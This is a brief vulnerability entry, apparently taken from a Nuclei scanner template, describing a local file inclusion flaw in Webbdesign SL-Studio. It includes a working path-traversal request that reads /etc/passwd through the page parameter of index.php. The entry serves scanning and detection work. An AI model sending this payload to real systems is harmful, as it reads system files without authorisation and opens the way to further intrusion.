# Vulnerability: Webbdesign SL-Studio - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`sl-studio-lfi.yaml`)

## Description
Webbdesign SL-Studio is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?page=../../../../../../../../../../etc/passwd
```

